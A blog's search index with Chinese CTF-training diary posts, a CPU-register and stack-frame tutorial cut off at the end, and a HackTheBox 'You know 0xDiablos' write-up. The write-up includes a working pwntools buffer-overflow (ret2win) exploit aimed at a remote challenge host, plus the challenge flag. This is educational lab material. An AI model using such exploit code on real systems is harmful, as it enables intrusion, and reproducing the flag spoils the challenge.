<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[Day 21] Pwn好難...但我會加油的</title>
      <link href="/posts/ab8b10a3/"/>
      <url>/posts/ab8b10a3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天寫題目的時候儘管找了近十篇的 writeups，還是有個原理一直沒有理解徹底，可能就是稍微知道個大概半很不貫徹，下次問問看學長能不能給點幫助好了。總之覺得 CTF 真的好難啊啊啊啊啊啊！但是我會加油的，因為我想要變強，也因為我很喜歡。</p><h1 id="今日進度">今日進度</h1><ol><li><a href="https://cx330.tw/posts/ca279614/">[HTB] You know 0xDiablos Writeup</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>07：45</code></p></li><li><p>知識量：⭐⭐⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] You know 0xDiablos Writeup</title>
      <link href="/posts/ca279614/"/>
      <url>/posts/ca279614/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Challenge-Info">0x00 Challenge Info</h1><p>As usual, let’s see the challenge desciption first.</p><blockquote><p>I missed my flag</p></blockquote><p>It’s a really simple description lol. Let’s directly dive into the analyzation part.</p><h1 id="0x01-Analyze">0x01 Analyze</h1><h2 id="Checksec">Checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/CTF/HTB/You know 0xDiablos]</span><br><span class="line">└─$ pwn checksec vuln                        </span><br><span class="line">[*] <span class="string">&#x27;/home/kali/CTF/HTB/You know 0xDiablos/vuln&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>All protecitons are off.</p><h2 id="Decompile">Decompile</h2><p>Main function of this binary.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = getegid();</span><br><span class="line">  setresgid(v4, v4, v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You know who are 0xDiablos: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>vuln()</code> seems interesting, let’s check what it does.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> INPUT[<span class="number">180</span>]; <span class="comment">// [esp+0h] [ebp-B8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(INPUT);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(INPUT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It allocates a memory space of 180 bytes and use <code>gets()</code> to ask for the input. As everybody knows, the <code>gets()</code> function is regarded as a super dangerous funtion, and the vulnerability of this challenge will happen here.</p><p>Besides this, you can notice that there’s still a cool function called <code>flag()</code>.  Let’s see the code below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hurry up and try in on server side.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEF</span> &amp;&amp; a2 == <span class="number">0xC0DED00D</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It reads the flag.txt file and outputs its contents as long as the condition is met, which is to make <code>a1</code> equals to <code>0xDEADBEEF</code> and <code>a2</code> equals to <code>0xC0DED00D</code>.</p><p>At this point, we can probably know that this challenge is a <strong>ret2win</strong> problem, so we should find the offset and the address of the function we want to execute.</p><h2 id="Get-Offset">Get Offset</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/kali/CTF/HTB/You know 0xDiablos/vuln </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">You know <span class="built_in">who</span> are 0xDiablos: </span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616177 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────</span><br><span class="line">*EAX  0xc9</span><br><span class="line">*EBX  0x62616175 (<span class="string">&#x27;uaab&#x27;</span>)</span><br><span class="line">*ECX  0xf7e258a0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDX  0x0</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0x8049330 (__libc_csu_init) ◂— push ebp</span><br><span class="line">*EBP  0x62616176 (<span class="string">&#x27;vaab&#x27;</span>)</span><br><span class="line">*ESP  0xffffcfb0 ◂— <span class="string">&#x27;xaabyaab&#x27;</span></span><br><span class="line">*EIP  0x62616177 (<span class="string">&#x27;waab&#x27;</span>)</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616177</span><br><span class="line">────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffcfb0 ◂— <span class="string">&#x27;xaabyaab&#x27;</span></span><br><span class="line">01:0004│     0xffffcfb4 ◂— <span class="string">&#x27;yaab&#x27;</span></span><br><span class="line">02:0008│     0xffffcfb8 —▸ 0xf7fc2400 ◂— <span class="string">&#x27;gnu/libc.so.6&#x27;</span></span><br><span class="line">03:000c│     0xffffcfbc ◂— 0x3e8</span><br><span class="line">04:0010│     0xffffcfc0 —▸ 0xffffcfe0 ◂— 0x1</span><br><span class="line">05:0014│     0xffffcfc4 —▸ 0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">06:0018│     0xffffcfc8 ◂— 0x0</span><br><span class="line">07:001c│     0xffffcfcc —▸ 0xf7c23c65 (__libc_start_call_main+117) ◂— add esp, 0x10</span><br><span class="line">──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x62616177</span><br><span class="line">   1 0x62616178</span><br><span class="line">   2 0x62616179</span><br><span class="line">   3 0xf7fc2400</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><ul><li><code>EIP</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l waab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;waab&#x27;</span> (hex: 0x77616162)</span><br><span class="line">Found at offset 188</span><br></pre></td></tr></table></figure><ul><li><code>ESP</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l xaab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;xaab&#x27;</span> (hex: 0x78616162)</span><br><span class="line">Found at offset 192</span><br></pre></td></tr></table></figure><h1 id="0x02-Exploit">0x02 Exploit</h1><p>Since we know that the offset to control the <code>EIP</code> is 188, we can build our exploit! Here’s the step.</p><ol><li>Overflow and overwrite the <code>EIP</code> to the address of <code>flag()</code>.</li><li>Concat the ROP Chain with the value of a1 and a1, which is 0xDEADBEEF and 0xC0DED00D.</li><li>Pwned.</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C stream          dd ?                    ; offset</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004 var_4           dd ?</span><br><span class="line">+0000000000000000  s              db 4 dup(?)</span><br><span class="line">+0000000000000004  r              db 4 dup(?)</span><br><span class="line">+0000000000000008 arg_0           dd ?</span><br><span class="line">+000000000000000C arg_4           dd ?</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><p>By this stack frame view of <code>flag()</code> from IDA, we can see that when we overflow the <code>var_4</code> and <code>s</code>, we can get to the <code>r</code>, which is the return address. Furthermore, once we overflow the return address, it comes to <code>arg_0</code> &amp; <code>arg_4</code>, which are a1 &amp; a2. So I write the exploit like this.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">188</span></span><br><span class="line">flag_addr = <span class="number">0x080491E2</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p32(flag_addr) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xC0DED00D</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.53.53&quot;</span>, <span class="number">56739</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>But this didn’t work. It got EOF and didn’t receive the flag. After searching on the web, I found <a href="https://github.com/jojoCode123/IosifOS/blob/master/hackthebox/challenges/pwn/you-know-0xdiablos.md">this article</a> somehow explain the issue here. Although I cannot 100% understand the thing in this article, I still find the issue using my own way (if something wrong please tell me in the comments thx).</p><p>If we set the ROP chain like <code>b&quot;A&quot; * offset + p32(flag_addr) + p32(0xDEADBEEF) + p32(0xC0DED00D)</code>, the <code>0xDEADBEEF</code> won’t be the value of <code>a1</code>, instead, it will be filled in the <code>ESP</code>. For example, I use cyclic 300 to create the pattern and check the value of the registers.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────</span><br><span class="line">*EAX  0x12d</span><br><span class="line">*EBX  0x62616175 (<span class="string">&#x27;uaab&#x27;</span>)</span><br><span class="line">*ECX  0xf7e258a0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDX  0x0</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0x8049330 (__libc_csu_init) ◂— push ebp</span><br><span class="line">*EBP  0x62616176 (<span class="string">&#x27;vaab&#x27;</span>)</span><br><span class="line">*ESP  0xffffcfb0 ◂— <span class="string">&#x27;xaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac&#x27;</span></span><br><span class="line">*EIP  0x62616177 (<span class="string">&#x27;waab&#x27;</span>)</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>As you can see, the “xaab” is right after the “waab”, but here the “xaab” isn’t the value of <code>a1</code>. That’s because when a function is called (like flag() in this case), the current return address is pushed onto the stack so that the program can return after executing the function. So we need to cover that return address. Since it’s a 32-bit ELF, I use <code>p32()</code>. By doing so, the <code>EIP</code> will pointing to this address we cover. But the thing inside the <code>p32</code> can be anything though since it’s just a placeholder to make sure the program won’t crash. Here’s the finall exploit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">188</span></span><br><span class="line">flag_addr = <span class="number">0x080491E2</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p32(flag_addr) + p32(<span class="number">1337</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xC0DED00D</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.53.53&quot;</span>, <span class="number">56739</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-Pwned">0x03 Pwned</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;0ur_Buff3r_1s_not_healthy&#125;</span><br></pre></td></tr></table></figure><p>Although I found the flag, I searched for a lot of writeups during the challenge. And I don’t think I totally understand the whole concept of this challenge, probably just about 80% only. I’ll keep leaning new stuff and reviewing things I learned, hope one day I can entirely understand this challenge. And that day, I will be back here and try to fix everything wrong in this article.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 20] HTB Academy - Stack-Based Buffer Overflows on Linux x86</title>
      <link href="/posts/4e5b6228/"/>
      <url>/posts/4e5b6228/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>補一下昨天的進度，昨天看了看 HTB Academy 的 Stack-Based Buffer Overflows on Linux x86 這堂課。把原本對於 Pwn 的一些基礎知識補起來，也重新再了解一次各個 Register 的功能。總之這個課程還不錯滿推薦的。</p><h1 id="今日進度">今日進度</h1><ol><li><a href="https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>09：45</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intro to CPU Registers</title>
      <link href="/posts/1d65dc6/"/>
      <url>/posts/1d65dc6/</url>
      
        <content type="html"><![CDATA[<h1 id="Discalimer-⚠️">Discalimer ⚠️</h1><p>The resources for this article are from <a href="https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86">Stack-Based Buffer Overflows on Linux x86</a>, and this article is intended only for personal review. It is advisable to consult the original resource for more detailed information.</p><h1 id="CPU-Registers">CPU Registers</h1><p>Registers are the essential parts of CPU. Almost every register have a small amout of storage space to store   data temporarily. These registers can be classified as General registers, Control registers, Segment registers. The one we care the most is General registers. In these, they can be subdevided into Data registers, Pointer registers, and Index registers.</p><h2 id="Data-registers">Data registers</h2><table><thead><tr><th style="text-align:left">32-bit Register</th><th style="text-align:left">64-bit Register</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left"><code>EAX</code></td><td style="text-align:left"><code>RAX</code></td><td style="text-align:left">Accumulator is used in Input/Output and for arithmetic operations</td></tr><tr><td style="text-align:left"><code>EBX</code></td><td style="text-align:left"><code>RBX</code></td><td style="text-align:left">Base is used in indexed addressing</td></tr><tr><td style="text-align:left"><code>ECX</code></td><td style="text-align:left"><code>RCX</code></td><td style="text-align:left">Counter is used to rotate instructions &amp; count loops</td></tr><tr><td style="text-align:left"><code>EDX</code></td><td style="text-align:left"><code>RDX</code></td><td style="text-align:left">Data is used for Input/Output and in arithmetic operations for multiply and divide operations involving large values</td></tr></tbody></table><h2 id="Pointer-registers">Pointer registers</h2><table><thead><tr><th style="text-align:left">32-bit Register</th><th style="text-align:left">64-bit Register</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left"><code>EIP</code></td><td style="text-align:left"><code>RIP</code></td><td style="text-align:left">Instruction Pointer (IP) stores the offset address of the next instruction to be executed</td></tr><tr><td style="text-align:left"><code>ESP</code></td><td style="text-align:left"><code>RSP</code></td><td style="text-align:left">Stack Pointer (SP) points to the top of the stack</td></tr><tr><td style="text-align:left"><code>EBP</code></td><td style="text-align:left"><code>RBP</code></td><td style="text-align:left">Base Pointer (BP) points to the base of the stack</td></tr></tbody></table><h2 id="Index-registers">Index registers</h2><table><thead><tr><th style="text-align:left">32-bit Register</th><th style="text-align:left">64-bit Register</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left"><code>ESI</code></td><td style="text-align:left"><code>RSI</code></td><td style="text-align:left">Source Index is used as a pointer from a source for string operations</td></tr><tr><td style="text-align:left"><code>EDI</code></td><td style="text-align:left"><code>RDI</code></td><td style="text-align:left">Destination is used as a pointer to a destination for string operations</td></tr></tbody></table><h1 id="Stack-Frames">Stack Frames</h1><p>Since the stack starts with a high address and grows down to low memory addresses as values are added, the <code>Base Pointer</code> points to the beginning (base) of the stack, while the <code>Stack Pointer</code> points to the top of the stack.</p><p>As the stack grows, it is logically divided into regions called <code>Stack Frames</code>, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (<code>EBP</code>) and the end (<code>ESP</code>) that is pushed onto the stack when a function is called.</p><p>Since the stack memory is built on a <code>Last-In-First-Out</code> (<code>LIFO</code>) data structure, the first step is to store the previous <code>EBP</code> position on the stack, which can be restored after the function completes. If we now look at the <code>bowfunc</code> function, it looks like following in GDB:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:    push   ebp       <span class="comment"># &lt;---- 1. Stores previous EBP</span></span><br><span class="line">   0x0000054e &lt;+1&gt;:    mov    ebp,esp</span><br><span class="line">   0x00000550 &lt;+3&gt;:    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:    sub    esp,0x404</span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:ret    </span><br></pre></td></tr></table></figure><p>The <code>EBP</code> in the stack frame is set first when a function is called and contains the <code>EBP</code> of the previous stack frame. Next, the value of the <code>ESP</code> is copied to the <code>EBP</code>, creating a new stack frame.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:    push   ebp       <span class="comment"># &lt;---- 1. Stores previous EBP</span></span><br><span class="line">   0x0000054e &lt;+1&gt;:    mov    ebp,esp   <span class="comment"># &lt;---- 2. Creates new Stack Frame</span></span><br><span class="line">   0x00000550 &lt;+3&gt;:    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:    sub    esp,0x404 </span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:ret </span><br></pre></td></tr></table></figure><p>Then some space is created in the stack, moving the <code>ESP</code> to the top for the operations and variables needed and processed.</p><h2 id="Function-Prologue">Function Prologue</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:    push   ebp       <span class="comment"># &lt;---- 1. Stores previous EBP</span></span><br><span class="line">   0x0000054e &lt;+1&gt;:    mov    ebp,esp   <span class="comment"># &lt;---- 2. Creates new Stack Frame</span></span><br><span class="line">   0x00000550 &lt;+3&gt;:    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:    sub    esp,0x404 <span class="comment"># &lt;---- 3. Moves ESP to the top</span></span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:leave  </span><br><span class="line">   0x00000581 &lt;+52&gt;:ret    </span><br></pre></td></tr></table></figure><p>These three instructions represent the so-called <code>Prologue</code>.</p><p>For getting out of the stack frame, the opposite is done, the <code>Epilogue</code>. During the epilogue, the <code>ESP</code> is replaced by the current <code>EBP</code>, and its value is reset to the value it had before in the prologue. The epilogue is relatively short, and apart from other possibilities to perform it, in our example, it is performed with two instructions:</p><h2 id="Function-Epilogue">Function Epilogue</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas bowfunc </span><br><span class="line"></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> bowfunc:</span><br><span class="line">   0x0000054d &lt;+0&gt;:    push   ebp       </span><br><span class="line">   0x0000054e &lt;+1&gt;:    mov    ebp,esp   </span><br><span class="line">   0x00000550 &lt;+3&gt;:    push   ebx</span><br><span class="line">   0x00000551 &lt;+4&gt;:    sub    esp,0x404 </span><br><span class="line">   &lt;...SNIP...&gt;</span><br><span class="line">   0x00000580 &lt;+51&gt;:leave  <span class="comment"># &lt;----------------------</span></span><br><span class="line">   0x00000581 &lt;+52&gt;:ret    <span class="comment"># &lt;--- Leave stack frame</span></span><br></pre></td></tr></table></figure><h1 id="Endianness">Endianness</h1><p>During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called <code>endianness</code>. Endianness is distinguished between the <code>little-endian</code> format and the <code>big-endian</code> format.</p><p><code>Big-endian</code> and <code>little-endian</code> are about the order of valence. In <code>big-endian</code>, the digits with the highest valence are initially. In <code>little-endian</code>, the digits with the lowest valence are at the beginning. Mainframe processors use the <code>big-endian</code> format, some RISC architectures, minicomputers, and in TCP/IP networks, the byte order is also in <code>big-endian</code> format.</p><p>Now, let us look at an example with the following values:</p><ul><li>Address: <code>0xffff0000</code></li><li>Word: <code>\xAA\xBB\xCC\xDD</code></li></ul><table><thead><tr><th style="text-align:left">Memory Address</th><th style="text-align:left">0xffff0000</th><th style="text-align:left">0xffff0001</th><th 